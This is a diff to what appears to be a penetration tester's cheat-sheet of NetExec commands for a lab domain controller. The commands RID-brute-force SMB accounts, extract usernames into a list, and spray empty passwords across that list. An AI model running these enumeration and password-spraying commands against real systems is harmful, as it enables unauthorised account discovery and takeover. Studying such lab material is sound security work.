@@ -109,6 +109,8 @@ Reference: [NetExec](https://github.com/Aghalarovf/Penetration-Tester/edit/main/
 nxc smb dc.sendai.vl -u 'test' -p '' --rid-brute 10000 > nxc_result.txt
 cat nxc_result.txt | grep TypeUser | awk '{ print $6}' | cut -d '\' -f 2 > users.txt
 
+nxc smb dc.sendai.vl -u users.txt -p '' ( PASSWORD_CHANGE_MUST )
+
 # Usernameanarchy
 ./username-anarchy --input-file /home/sako/Labaratory/hostname
 
